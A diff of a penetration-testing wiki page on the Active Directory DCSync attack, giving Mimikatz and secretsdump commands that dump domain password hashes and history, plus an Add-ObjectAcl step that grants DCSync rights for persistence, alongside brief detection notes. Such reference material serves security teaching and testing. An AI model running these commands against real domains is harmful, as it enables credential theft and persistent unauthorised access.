@@ -34,33 +34,46 @@ The **DCSync** permission implies having these permissions over the domain itsel
 
 Check who has these permissions using `powerview`:
 
-```bash
-Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
+```powershell
+Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
 ```
 
 ### Exploit Locally
 
-```bash
+```powershell
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 
 ### Exploit Remotely
 
-```bash
-secretsdump.py -just-dc <user>:<password>@<ipaddress>
+```powershell
+secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
+[-just-dc-user <USERNAME>] #To get only of that user
+[-pwd-last-set] #To see when each account's password was last changed
+[-history] #To dump password history, may be helpful for offline password cracking
 ```
+
+&#x20;`-just-dc`  generates 3 files:
+
+* one with the **NTLM hashes**
+* one withe the **Kerberos keys**
+*   one with cleartext passwords from the NTDS for any accounts set with [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) **** enabled. You can get users with reversible encryption with&#x20;
+
+    ```powershell
+    Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+    ```
 
 ### Persistence
 
 If you are a domain admin, you can grant this permissions to any user with the help of `powerview`:
 
-```bash
+```powershell
 Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
 ```
 
 Then, you can **check if the user was correctly assigned** the 3 privileges looking for them in the output of (you should be able to see the names of the privileges inside the "ObjectType" field):
 
-```bash
+```powershell
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
 ```
 
@@ -71,7 +84,10 @@ Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveG
 * Security Event ID 4670 (Audit Policy for object must be enabled) – Permissions on an object were changed
 * AD ACL Scanner - Create and compare create reports of ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)
 
-[**More information about DCSync in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync) [**More information about DCSync**](https://yojimbosecurity.ninja/dcsync/)
+## References
+
+* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
+* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
 
 <details>
 
